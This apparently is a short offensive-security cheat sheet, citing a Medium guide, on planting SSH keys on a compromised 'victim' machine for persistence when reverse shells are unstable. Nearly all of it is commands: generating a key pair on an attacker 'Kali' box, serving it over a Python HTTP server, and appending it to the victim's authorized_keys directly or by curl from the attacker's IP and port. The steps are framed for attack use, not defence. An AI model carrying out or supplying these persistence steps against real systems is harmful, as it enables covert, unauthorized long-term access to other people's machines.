https://medium.com/@cuncis/implanting-ssh-keys-a-step-by-step-guide-with-command-examples-f57b21690854

The following are steps on how to generate SSH keys and use them to gain access. Use this in instances where reverse shells are unstable, if you need persistence, etc...

Kali
```bash
# Create key pair, specify specifics

ssh-keygen -t <format(rsa,dsa,etc...)> -f <output_name>

# modify perms on key

chmod 400 <private_key>

# Host on python server (optional)

python3 -m http.server <port>
```

Victim
```bash
# Append public key to authorized_keys

echo "<public_key_contents>" >> /path/to/.ssh/authorized_keys

# curl variant

curl <kali_ip>:<port>/<public_key>  >> /path/to/.ssh/authorized_keys

```
